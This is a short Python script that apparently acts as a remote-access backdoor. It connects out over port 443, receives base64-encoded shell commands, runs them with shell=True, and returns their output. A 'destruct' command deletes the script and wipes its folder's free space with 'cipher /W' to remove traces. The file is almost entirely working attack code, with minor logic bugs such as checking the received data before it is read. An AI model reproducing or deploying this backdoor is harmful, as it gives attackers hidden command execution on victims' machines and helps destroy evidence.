import socket
import subprocess
import os
import base64
import time
import sys


def destruct():
    client.close()
    os.remove(self_path)
    folder_path = os.path.dirname(self_path)
    os.system("cipher /W:%s" % folder_path)


def lets_talk():
    data = None
    while data is None:
        try:
            client.connect((host, port))
            client.send("ok")

            if data == base64.b64encode('destruct'):
                destruct()
                sys.exit()

            data = client.recv(BUFFER_SIZE)
            process = subprocess.Popen(
                base64.b64decode(data),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout_value = process.stdout.read() + process.stderr.read()
            client.send(base64.b64encode(stdout_value))
            time.sleep(5)
        except:
            pass
        else:
            break


if __name__ == "__main__":
    self_path = os.path.abspath(__file__)
    host = socket.gethostname()
    port = 443
    BUFFER_SIZE = 4096
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        lets_talk()
        time.sleep(30)



